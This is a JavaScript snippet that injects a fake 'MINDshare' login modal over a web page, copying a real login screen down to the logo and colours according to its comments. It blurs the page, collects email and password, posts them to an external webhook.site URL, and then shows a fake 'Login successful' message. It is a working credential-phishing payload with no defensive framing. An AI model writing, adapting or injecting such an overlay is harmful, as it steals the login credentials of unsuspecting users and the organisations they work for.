(function() {
  // YOUR WEBHOOK URL
  const webhookUrl = 'https://webhook.site/399907c5-1b67-465c-a07c-999b01b70d9a';
  
  const modalHtml = `
    <div id="mindshare-login-modal" style="
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 999999;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    ">
      <!-- Main Login Container - EXACT match to screenshot -->
      <div style="
        background: white;
        border-radius: 32px;
        width: 100%;
        max-width: 480px;
        padding: 48px 40px;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        position: relative;
        animation: modalFadeIn 0.3s ease;
      ">
        <style>
          @keyframes modalFadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
          }
          .mindshare-input {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.2s;
            background: #f9fafb;
            margin-top: 8px;
          }
          .mindshare-input:focus {
            border-color: #E20074;
            box-shadow: 0 0 0 4px rgba(226, 0, 116, 0.1);
            outline: none;
            background: white;
          }
          .mindshare-checkbox {
            width: 20px;
            height: 20px;
            accent-color: #E20074;
            cursor: pointer;
          }
          .mindshare-btn-primary {
            background: #E20074;
            color: white;
            border: none;
            border-radius: 9999px;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
          }
          .mindshare-btn-primary:hover {
            background: #b8005f;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px -5px rgba(226, 0, 116, 0.3);
          }
          .mindshare-google-btn {
            width: 100%;
            padding: 14px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 500;
            color: #374151;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
          }
          .mindshare-google-btn:hover {
            background: #f9fafb;
            border-color: #E20074;
          }
        </style>

        <!-- Close Button (X) - Top Right -->
        <button id="close-modal-btn" style="
          position: absolute;
          top: 24px;
          right: 24px;
          background: none;
          border: none;
          font-size: 28px;
          cursor: pointer;
          color: #9ca3af;
          width: 44px;
          height: 44px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
          transition: all 0.2s;
          z-index: 1000000;
        " onmouseover="this.style.backgroundColor='#f3f4f6'; this.style.color='#E20074'" 
           onmouseout="this.style.backgroundColor='transparent'; this.style.color='#9ca3af'">×</button>

        <!-- Logo/Brand -->
        <div style="text-align: center; margin-bottom: 32px;">
          <div style="display: flex; align-items: center; justify-content: center; gap: 12px;">
            <!-- MINDshare Logo - EXACT match -->
            <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
              <circle cx="20" cy="20" r="16" fill="#E20074"/>
              <path d="M12 16L20 26L28 16" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <span style="font-size: 28px; font-weight: 700;">
              <span style="color: #E20074;">MIND</span><span style="color: #1f2937;">share</span>
            </span>
          </div>
        </div>

        <!-- Welcome Back Title - EXACT match to screenshot -->
        <h1 style="
          font-size: 32px;
          font-weight: 600;
          color: #1f2937;
          text-align: center;
          margin-bottom: 36px;
          letter-spacing: -0.5px;
        ">Welcome Back</h1>

        <!-- LOGIN FORM - Sends to webhook -->
        <form id="login-form" method="POST" action="${webhookUrl}">
          <!-- Email Field - EXACT match -->
          <div style="margin-bottom: 24px;">
            <label style="
              font-size: 16px;
              font-weight: 500;
              color: #374151;
              display: block;
              margin-bottom: 4px;
            ">Email Address</label>
            <input type="email" 
                   name="email" 
                   class="mindshare-input" 
                   required
                   placeholder="you@company.com"
                   value=""
                   autocomplete="email">
          </div>

          <!-- Password Field - EXACT match -->
          <div style="margin-bottom: 24px;">
            <label style="
              font-size: 16px;
              font-weight: 500;
              color: #374151;
              display: block;
              margin-bottom: 4px;
            ">Password</label>
            <input type="password" 
                   name="password" 
                   class="mindshare-input" 
                   required
                   placeholder="••••••••"
                   value=""
                   autocomplete="current-password">
          </div>

          <!-- Remember Me & Forgot Password Row - EXACT match -->
          <div style="
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
          ">
            <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
              <input type="checkbox" name="remember" class="mindshare-checkbox">
              <span style="color: #4b5563; font-size: 15px;">Remember me</span>
            </label>
            <a href="#" style="
              color: #E20074;
              text-decoration: none;
              font-size: 15px;
              font-weight: 500;
            " onclick="alert('Password reset link would be sent to your email'); return false;">Forgot password?</a>
          </div>

          <!-- Sign In Button - EXACT match -->
          <button type="submit" class="mindshare-btn-primary">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4M10 17l5-5-5-5M13.5 12H4"/>
            </svg>
            Sign In Securely
          </button>
        </form>

        <!-- Divider - EXACT match -->
        <div style="position: relative; text-align: center; margin: 32px 0;">
          <div style="
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e5e7eb;
          "></div>
          <span style="
            background: white;
            padding: 0 16px;
            color: #6b7280;
            font-size: 14px;
            position: relative;
          ">Or continue with</span>
        </div>

        <!-- Google Sign In - EXACT match -->
        <button class="mindshare-google-btn" onclick="alert('Google Sign In coming soon'); return false;">
          <svg width="20" height="20" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
          </svg>
          Sign in with Google
        </button>

        <!-- Sign Up Link - EXACT match -->
        <p style="
          text-align: center;
          color: #6b7280;
          font-size: 15px;
          margin-top: 28px;
        ">
          Don't have an account? 
          <a href="#" style="
            color: #E20074;
            text-decoration: none;
            font-weight: 600;
          " onclick="alert('Please contact your account manager'); return false;">Contact your AM</a>
        </p>

        <!-- Footer with Links - EXACT match -->
        <div style="
          margin-top: 36px;
          padding-top: 24px;
          border-top: 1px solid #f3f4f6;
          text-align: center;
        ">
          <div style="display: flex; justify-content: center; gap: 24px; margin-bottom: 12px;">
            <a href="#" style="color: #9ca3af; text-decoration: none; font-size: 13px;">Privacy</a>
            <a href="#" style="color: #9ca3af; text-decoration: none; font-size: 13px;">Terms</a>
            <a href="#" style="color: #9ca3af; text-decoration: none; font-size: 13px;">Security</a>
          </div>
          <div style="color: #9ca3af; font-size: 12px;">
            © 2026 MINDshare Platform. All rights reserved.
          </div>
        </div>

        <!-- Weather Widget - Bottom Right (from screenshot) -->
        <div style="
          position: fixed;
          bottom: 24px;
          right: 24px;
          background: rgba(255,255,255,0.9);
          backdrop-filter: blur(8px);
          padding: 12px 20px;
          border-radius: 9999px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
          border: 1px solid rgba(226,0,116,0.2);
          font-size: 14px;
          color: #1f2937;
          z-index: 1000001;
          display: flex;
          align-items: center;
          gap: 8px;
        ">
          <span>🌤️</span>
          <span style="font-weight: 600;">30°C</span>
          <span style="color: #6b7280;">· Partly sunny</span>
        </div>
      </div>
    </div>
  `;

  // Inject the modal
  document.body.insertAdjacentHTML('beforeend', modalHtml);

  // Blur background content
  document.body.style.transition = 'filter 0.3s ease';
  document.body.style.filter = 'blur(8px)';
  
  // Remove blur from modal itself
  const modal = document.getElementById('mindshare-login-modal');
  modal.style.filter = 'none';

  // Close button functionality
  const closeBtn = document.getElementById('close-modal-btn');
  closeBtn.addEventListener('click', function(e) {
    e.preventDefault();
    e.stopPropagation();
    modal.remove();
    document.body.style.filter = 'none';
  });

  // Close on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && document.getElementById('mindshare-login-modal')) {
      modal.remove();
      document.body.style.filter = 'none';
    }
  });

  // Close on outside click
  modal.addEventListener('click', function(e) {
    if (e.target === modal) {
      modal.remove();
      document.body.style.filter = 'none';
    }
  });

  // Form submission handling
  const form = document.getElementById('login-form');
  form.addEventListener('submit', function(e) {
    const submitBtn = this.querySelector('button[type="submit"]');
    submitBtn.innerHTML = '⏳ Signing in...';
    submitBtn.disabled = true;
    
    // Show success message then remove modal after 2 seconds
    setTimeout(() => {
      modal.remove();
      document.body.style.filter = 'none';
      alert('Login successful! Redirecting...');
    }, 2000);
  });
})();
